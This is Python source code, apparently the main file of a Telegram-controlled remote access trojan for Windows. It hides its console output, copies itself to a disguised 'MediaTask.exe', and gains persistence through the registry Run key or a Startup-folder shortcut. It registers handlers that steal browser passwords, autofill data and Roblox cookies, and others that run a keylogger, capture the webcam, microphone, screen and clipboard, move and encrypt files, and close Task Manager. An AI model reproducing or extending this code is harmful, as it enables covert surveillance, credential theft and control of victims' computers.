##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/



from config import API_TOKEN, ALLOWED_USER_ID, MAX_ATTEMPTS, MAX_MESSAGE_LENGTH, destination_folder, directory, file_ids

import os
import logging
import sys
import asyncio
import shutil
from pathlib import Path
import subprocess
import winreg
from aiogram import types
from aiogram.filters import Command
from aiogram import F



sys.stdout = open(os.devnull, 'w')  
sys.stderr = open(os.devnull, 'w')  
logging.basicConfig(level=logging.CRITICAL + 1)
logging.getLogger('aiogram').disabled = True


logging.basicConfig(level=logging.INFO)


from config import bot, dp


def extract_file(resource_name, output_path):
    if not os.path.exists(output_path):
        current_dir = Path(__file__).resolve().parent
        resource_path = current_dir / resource_name

        if resource_path.exists():
            shutil.copy(resource_path, output_path)
        else:
            raise FileNotFoundError(f'Resource {resource_path} not found')


def copy_and_rename(destination_folder, new_name, icon_path=None):
    new_file_path = os.path.join(destination_folder, new_name)

    if os.path.exists(new_file_path):
        return "–§–∞–π–ª —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç. –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è."

    current_file = sys.argv[0]

    try:
        shutil.copy(current_file, new_file_path)

        return f"–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω –≤ {new_file_path}"
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏: {e}"


def add_to_registry(script_path):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                 winreg.KEY_SET_VALUE)

        winreg.SetValueEx(reg_key, "MediaTask", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg_key)

        return True
    except Exception:
        return False


def add_to_startup_folder(script_path):
    try:
        startup_folder = os.path.expandvars(
            r"%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        )

        shortcut_name = "MediaTask.lnk"
        shortcut_path = os.path.join(startup_folder, shortcut_name)

        if os.path.exists(shortcut_path):
            return

        ps_command = (
            f"$s = (New-Object -COM WScript.Shell).CreateShortcut('{shortcut_path}'); "
            f"$s.TargetPath = '{script_path}'; "
            f"$s.WorkingDirectory = '{os.path.dirname(script_path)}'; "
            f"$s.Save()"
        )

        subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True)
    except Exception:
        pass


from lib.texts import user_languages

# Texts for different languages
TEXTS = {
    'ru': {
        'start': (
            " –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é, root. –Ø –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ.\n\n"
            " –î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n\n"
            " –û—Å–Ω–æ–≤–Ω–æ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:\n"
            "/start ‚Äî –ó–∞–ø—É—Å—Ç–∏—Ç—å –±–æ—Ç–∞\n"
            "/pc_data ‚Äî –ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ü–ö\n"
            "/network_diagnostics ‚Äî –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ —Å–µ—Ç–∏\n"
            "/shutdown_pc ‚Äî –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö\n"
            "/restart_pc ‚Äî –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö\n"
            "/self_destruction ‚Äî –£–¥–∞–ª–∏—Ç—å –±–æ—Ç–∞ —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞\n\n"
            " –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏ –∑–∞—â–∏—Ç–∞:\n"
            "/antivirus ‚Äî –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã\n"
            "/cmd_boom ‚Äî –í—ã–≤–µ—Å—Ç–∏ –æ—à–∏–±–∫—É CMD\n"
            "/close_task_manager ‚Äî –ó–∞–∫—Ä—ã—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á\n\n"
            " –°–∫—Ä–∏–Ω—à–æ—Ç—ã –∏ –∑–∞–ø–∏—Å—å:\n"
            "/screenshot ‚Äî –°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç\n"
            "/snapshot ‚Äî –§–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã\n"
            "/web_record ‚Äî –í–∏–¥–µ–æ–∑–∞–ø–∏—Å—å —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã\n"
            "/audio_record ‚Äî –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞\n"
            "/play_sound ‚Äî –ü—Ä–æ–∏–≥—Ä–∞—Ç—å –∑–≤—É–∫\n\n"
            " –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥:\n"
            "/key_logger ‚Äî –ó–∞–ø—É—Å—Ç–∏—Ç—å –∫–µ–π–ª–æ–≥–≥–µ—Ä\n"
            "/key_logs ‚Äî –ü–æ–ª—É—á–∏—Ç—å –ª–æ–≥ –∫–ª–∞–≤–∏—à\n"
            "/clipboard_content ‚Äî –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞\n"
            "/chrome_history ‚Äî –ò—Å—Ç–æ—Ä–∏—è Chrome\n"
            "/opera_history ‚Äî –ò—Å—Ç–æ—Ä–∏—è Opera\n"
            "/autofill ‚Äî –ê–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞\n"
            "/passwords ‚Äî –ü–∞—Ä–æ–ª–∏ –±—Ä–∞—É–∑–µ—Ä–∞\n"
            "/robloxcookie ‚Äî –ü–æ–ª—É—á–∏—Ç—å Roblox cookie\n\n"
            "/processes ‚Äî –ê–∫—Ç–∏–≤–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã\n"
            "/fullprocesses ‚Äî –í—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã\n"
            "/terminate_process ‚Äî –ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å\n\n"
            " –§–∞–π–ª—ã –∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏:\n"
            "/send_file ‚Äî –ü–æ–ª—É—á–∏—Ç—å —Ñ–∞–π–ª\n"
            "/upload_file ‚Äî –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª\n"
            "/delete_file ‚Äî –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª\n"
            "/move_file ‚Äî –ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å —Ñ–∞–π–ª\n"
            "/create_folder ‚Äî –°–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É\n"
            "/delete_folder ‚Äî –£–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É\n"
            "/show_directory_content ‚Äî –°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤\n"
            "/change_directory ‚Äî –°–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é\n\n"
            " –£–¥–∞–ª—ë–Ω–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è:\n"
            "/open_url ‚Äî –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É –≤ –±—Ä–∞—É–∑–µ—Ä–µ\n"
            "/alt_f4 ‚Äî –ó–∞–∫—Ä—ã—Ç—å –∞–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ\n"
            "/minimize_all_windows ‚Äî –°–≤–µ—Ä–Ω—É—Ç—å –≤—Å–µ –æ–∫–Ω–∞\n"
            "/change_wallpaper ‚Äî –°–º–µ–Ω–∏—Ç—å –æ–±–æ–∏ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞\n\n"
            " –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∑–≤—É–∫–æ–º:\n"
            "/mute_sound ‚Äî –í—ã–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫\n"
            "/unmute_sound ‚Äî –í–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫\n"
            "/set_volume_100 ‚Äî –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å 100%\n\n"
            " –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ:\n"
            "/encrypt_file ‚Äî –ó–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª\n"
            "/decipher_file ‚Äî –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª\n"
        ),
        'ready': "–ì–æ—Ç–æ–≤ –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é",
        'choose_language': "–í—ã–±–µ—Ä–∏—Ç–µ —è–∑—ã–∫ / Choose language:",
        'language_buttons': ["–†—É—Å—Å–∫–∏–π üá∑üá∫", "English üá¨üáß"],
        'language_selected': "–Ø–∑—ã–∫ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ —Ä—É—Å—Å–∫–∏–π üá∑üá∫",
        'buttons': [
            ["–°–º–µ–Ω–∞ —è–∑—ã–∫–∞"],
            ["–ê–Ω—Ç–∏–≤–∏—Ä—É—Å", "–°–∫—Ä–∏–Ω—à–æ—Ç"],
            ["–ü—Ä–æ—Ü–µ—Å—ã", "–§–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã"],
            ["–ü–æ–ª–Ω—ã–π –æ—Ç—á–µ—Ç –ø–æ –ø—Ä–æ—Ü–µ—Å–∞–º", "–ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å"],
            ["–°–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É", "–£–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É"],
            ["–°–æ–¥–µ—Ä–∂–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏", "–ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å—Å—è –ø–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏"],
            ["–î–∞–Ω–Ω—ã–µ –ü–ö", "–î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ —Å–µ—Ç–∏"],
            ["–ó–∞–ø–∏—Å—å —Å –≤–µ–± –∫–∞–º–µ—Ä—ã", "–ó–∞–ø–∏—Å—å –∞—É–¥–∏–æ"],
            ["–û—Ç–∫—Ä—ã—Ç—å —Ñ–∞–π–ª", "–ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª"],
            ["–°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª", "–£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª"],
            ["–ó–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª", "–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª"],
            ["–ò—Å—Ç–æ—Ä–∏—è —Ö—Ä–æ–º–∞", "–ò—Å—Ç–æ—Ä–∏—è –æ–ø–µ—Ä—ã"],
            ["–ê–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞", "–ü–∞—Ä–æ–ª–∏ –±—Ä–∞—É–∑–µ—Ä–∞"],
            ["–†–æ–±–ª–æ–∫—Å –∫—É–∫–∏"],
            ["ALT + F4", "–°–≤–µ—Ä–Ω—É—Ç—å –≤—Å–µ –æ–∫–Ω–∞"],
            ["–ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞", "–ò–∑–º–µ–Ω–∏—Ç—å –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞"],
            ["–ó–∞–∫—Ä—ã—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á", "–û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É"],
            ["–í–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫", "–í—ã–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫"],
            ["–ó–≤—É–∫ –Ω–∞ 100%", "CMD –±–æ–º–±–∞"],
            ["–í—ã–∫–ª—é—á–∏—Ç—å –ü–ö", "–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö"],
            ["–ü–µ—Ä–µ–º–∏—Å—Ç–∏—Ç—å —Ñ–∞–π–ª", "–ü–æ–º–µ–Ω—è—Ç—å –æ–±–æ–∏"],
            ["key logger", "key logs"],
            ["–í–æ—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ –∑–≤—É–∫", "–°–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ"]
        ]
    },
    'en': {
        'start': (
            " Welcome, root. I'm ready to work.\n\n"
            " Available commands:\n\n"
            " Basic control:\n"
            "/start ‚Äî Start the bot\n"
            "/pc_data ‚Äî Get PC info\n"
            "/network_diagnostics ‚Äî Network diagnostics\n"
            "/shutdown_pc ‚Äî Shut down PC\n"
            "/restart_pc ‚Äî Restart PC\n"
            "/self_destruction ‚Äî Remove the bot from the device\n\n"
            " Security:\n"
            "/antivirus ‚Äî Check antivirus\n"
            "/cmd_boom ‚Äî Show CMD error\n"
            "/close_task_manager ‚Äî Close Task Manager\n\n"
            " Screenshots and Recording:\n"
            "/screenshot ‚Äî Take screenshot\n"
            "/snapshot ‚Äî Webcam photo\n"
            "/web_record ‚Äî Webcam video\n"
            "/audio_record ‚Äî Microphone audio\n"
            "/play_sound ‚Äî Play a sound\n\n"
            " Monitoring:\n"
            "/key_logger ‚Äî Start keylogger\n"
            "/key_logs ‚Äî Get key logs\n"
            "/clipboard_content ‚Äî Clipboard content\n"
            "/chrome_history ‚Äî Chrome history\n"
            "/opera_history ‚Äî Opera history\n"
            "/autofill ‚Äî Browser autofills\n"
            "/passwords ‚Äî Browser passwords\n"
            "/robloxcookie ‚Äî Get Roblox cookie\n\n"
            "/processes ‚Äî Active processes\n"
            "/fullprocesses ‚Äî All processes\n"
            "/terminate_process ‚Äî Kill process\n\n"
            " Files:\n"
            "/send_file ‚Äî Get file\n"
            "/upload_file ‚Äî Upload file\n"
            "/delete_file ‚Äî Delete file\n"
            "/move_file ‚Äî Move file\n"
            "/create_folder ‚Äî Create folder\n"
            "/delete_folder ‚Äî Delete folder\n"
            "/show_directory_content ‚Äî Directory content\n"
            "/change_directory ‚Äî Change directory\n\n"
            " Remote Actions:\n"
            "/open_url ‚Äî Open URL\n"
            "/alt_f4 ‚Äî Close active window\n"
            "/minimize_all_windows ‚Äî Minimize all windows\n"
            "/change_wallpaper ‚Äî Change wallpaper\n\n"
            " Sound:\n"
            "/mute_sound ‚Äî Mute\n"  
            "/unmute_sound ‚Äî Unmute\n"
            "/set_volume_100 ‚Äî Set volume to 100%\n\n"
            " Encryption:\n"
            "/encrypt_file ‚Äî Encrypt file\n"
            "/decipher_file ‚Äî Decrypt file\n"
        ),
        'ready': "Ready to use",
        'choose_language': "Choose language / –í—ã–±–µ—Ä–∏—Ç–µ —è–∑—ã–∫:",
        'language_buttons': ["–†—É—Å—Å–∫–∏–π üá∑üá∫", "English üá¨üáß"],
        'language_selected': "Language set to English üá¨üáß",
        'buttons': [
            ["Change language"],
            ["Antivirus", "Screenshot"],
            ["Processes", "Webcam Photo"],
            ["Full process report", "Terminate process"],
            ["Create folder", "Delete folder"],
            ["Directory content", "Change directory"],
            ["PC Info", "Network diagnostics"],
            ["Webcam record", "Audio record"],
            ["Open file", "Upload file"],
            ["Download file", "Delete file"],
            ["Encrypt file", "Decrypt file"],
            ["Chrome history", "Opera history"],
            ["Browser autofill", "Browser passwords"],
            ["Roblox cookie"],
            ["ALT + F4", "Minimize all windows"],
            ["View clipboard", "Change clipboard"],
            ["Close task manager", "Open URL"],
            ["Unmute sound", "Mute sound"],
            ["Volume 100%", "CMD bomb"],
            ["Shutdown PC", "Reboot PC"],
            ["Move file", "Change wallpaper"],
            ["Key logger", "Key logs"],
            ["Play sound", "Self-destruction"]
        ]
    }
}

# /start command handler
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id

    # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —è–∑—ã–∫ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é, –µ—Å–ª–∏ –µ–≥–æ –µ—â—ë –Ω–µ—Ç
    if user_id not in user_languages:
        user_languages[user_id] = 'en'  # –∏–ª–∏ 'ru' ‚Äî –ø–æ —Ç–≤–æ–µ–º—É –≤—ã–±–æ—Ä—É

    lang = user_languages[user_id]
    text = TEXTS[lang]['start']
    await message.answer(text)

    # Creating the keyboard using the selected language
    buttons = [[types.KeyboardButton(text=btn) for btn in row] for row in TEXTS[lang]['buttons']]
    keyboard = types.ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)
    await message.answer(TEXTS[lang]['ready'], reply_markup=keyboard)

# /language command
@dp.message(Command("language"))
async def cmd_language(message: types.Message):
    lang_buttons = [
        [types.KeyboardButton(text=TEXTS['ru']['language_buttons'][0]),
         types.KeyboardButton(text=TEXTS['ru']['language_buttons'][1])]
    ]
    keyboard = types.ReplyKeyboardMarkup(keyboard=lang_buttons, resize_keyboard=True)
    await message.answer(TEXTS['ru']['choose_language'], reply_markup=keyboard)

# Language selection handler
@dp.message(F.text.in_({"–†—É—Å—Å–∫–∏–π üá∑üá∫", "English üá¨üáß"}))
async def handle_language_choice(message: types.Message):
    user_id = message.from_user.id
    if message.text == "–†—É—Å—Å–∫–∏–π üá∑üá∫":
        user_languages[user_id] = 'ru'
        await message.answer(TEXTS['ru']['language_selected'])
    elif message.text == "English üá¨üáß":
        user_languages[user_id] = 'en'
        await message.answer(TEXTS['en']['language_selected'])

    
    await cmd_start(message)

@dp.message(F.text.in_({"–°–º–µ–Ω–∞ —è–∑—ã–∫–∞", "Change language"}))
async def handle_language_button(message: types.Message):
    await cmd_language(message)



###########################  ROBLOX COOKIE  #############################

from lib.Credintial.roblosecurity import register_roblosecurity_handler

register_roblosecurity_handler(dp)

#########################  BROWSER PASSWORDS  ###########################

from lib.Credintial.password import register_password_handler

register_password_handler(dp)

#########################  BROWSER AUTOFILL  ###########################

from lib.Credintial.autofill import register_autofill_handler

register_autofill_handler(dp)

###########################  PLAY SOUND  ###############################

from lib.Access.Audio.play_sound import register_play_sound_handlers

register_play_sound_handlers(dp)

############################# KEY LOGGER ###############################‚Ññ

from lib.System.Key_logger.key_logger_handlers import key_logger_handlers

key_logger_handlers(dp)

############################ KEY LOGS ####################################

from lib.System.Key_logger.key_logs_handlers import key_logs_handlers

key_logs_handlers(dp)

########################### ANTIVIRUS ####################################

from lib.System.Antivirus.antivirus_handlers import register_antivirus_handlers

register_antivirus_handlers(dp)

##########################  SCREENSHOT  #############################

from lib.Access.Screenshot.screenshot_handlers import register_screenshot_handlers

register_screenshot_handlers(dp)

######################## Snapshot  #########################

from lib.Access.Webcam.Snapshot import register_snapshot_handlers

register_snapshot_handlers(dp)

##########################  Processes list  ############################

from lib.System.Procceses.process import register_processes_handlers

register_processes_handlers(dp)

########################  Full list of processes  ########################

from lib.System.Procceses.fullprocesses import register_full_processes_handlers

register_full_processes_handlers(dp)

##########################  Terminating process ############################

from lib.System.Procceses.terminate_process import register_terminate_process_handlers

register_terminate_process_handlers(dp)

############################  Create a folder  ################################

from lib.System.Folders.create_folder import register_create_folder

register_create_folder(dp)

############################  Delete the folder  ################################

from lib.System.Folders.delete_fodlder import register_folder_delete

register_folder_delete(dp)

###########################  Download a file  ###################################

from lib.System.File.download_file import register_download_file

register_download_file(dp)

#############################  Delete the file  #################################

from lib.System.File.delete_file import register_delete_file

register_delete_file(dp)

########################  Directory value  ############################

from lib.System.More.directory_value import register_directory_value

register_directory_value(dp)

#########################  Move to directory  #############################

from lib.System.More.move_to_directory import register_cd

register_cd(dp)

##########################  Chrome history  ################################

from lib.Credintial.Chrome_history import register_chrome_history_handlers

register_chrome_history_handlers(dp)

#####################  Webcam record  #######################

from lib.Access.Webcam.Web_record import register_webcam_record_handlers

register_webcam_record_handlers(dp)

###############################  Alt F4  ##################################

from lib.System.Folders.altf4 import register_alt_f4_handlers

register_alt_f4_handlers(dp)

##############################  Close the folder  ############################

from lib.System.Folders.closefolders import register_minimize_all_windows_handlers

register_minimize_all_windows_handlers(dp)


############################ OPEN FOLDERS #################################

from lib.System.Folders.open_folders import register_open_file_handlers
from lib.states import DirectoryStateSaveFiles

register_open_file_handlers(dp)


############################  Load a file  #############################

from lib.System.File.load_file import register_load_file

register_load_file(dp)

############################# Audio record ###############################

from  lib.Access.Audio.recordmic_handlers import register_audio_handlers

register_audio_handlers(dp)

#######################  Check copied  #########################

from lib.System.More.check_copied import register_check_copied

register_check_copied(dp)

###########################  Open url  ##############################

from lib.System.More.open_url import register_open_url

register_open_url(dp)

########################  Close dp  ##########################

from lib.System.More.close_dp import register_close_dp

register_close_dp(dp)

###########################  Opera history  ############################

from lib.Credintial.Opera_history import register_opera_history_handlers

register_opera_history_handlers(dp)

###########################  Sound off  #############################

from lib.System.Sound.Sound_off import register_mute_handlers

register_mute_handlers(dp)

###########################  Sound on  ##############################

from lib.System.Sound.Sound_on import register_sound_handlers

register_sound_handlers(dp)

########################  Volume 100%  ##########################

from lib.System.Sound.volume_100 import register_volume_100

register_volume_100(dp)

##########################  Encrypt file  #############################

from lib.System.Crypt.Encrypt import register_encrypt_handlers

register_encrypt_handlers(dp)

############################ Discrypt file  ###############################

from lib.System.Crypt.discrypt import register_discrypt

register_discrypt(dp)

###############################  CMD bomb  ###############################

from lib.System.PC.cmd_bomb import register_cmd_bomb

register_cmd_bomb(dp)

###########################  PC info  ###########################

from lib.System.PC.pc_data import register_pc_data

register_pc_data(dp)

##########################  Wifi info  ##########################

from lib.System.PC.wifi_data import register_wifi_data

register_wifi_data(dp)

###########################  PC off  #############################

from lib.System.PC.pc_off import register_shutdown_handlers

register_shutdown_handlers(dp)

###########################  PC on  ##############################

from lib.System.PC.pc_reboot import register_reboot_handlers

register_reboot_handlers(dp)

############################  Wallpaper change  ###############################

from lib.System.PC.change_wallpaper import register_wallpaper_handlers

register_wallpaper_handlers(dp)

#########################  Move file  #############################

from lib.System.Folders.move_file import register_move_file

register_move_file(dp)

#############################  Self destruction  ###########################

from lib.System.PC.self_destruction import register_self_destruction

register_self_destruction(dp)

###########################################################################


async def main():
    destination_folder = r'C:\ProgramData\MediaTask'
    new_name = 'MediaTask.exe'
    icon_path = None  

    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)

    result = copy_and_rename(destination_folder, new_name, icon_path)
  
    await dp.start_polling(bot)


if __name__ == "__main__":
    script_path = 'C:\\ProgramData\\MediaTask\\MediaTask.exe'

    if not add_to_registry(script_path):
        add_to_startup_folder(script_path)

    asyncio.run(main())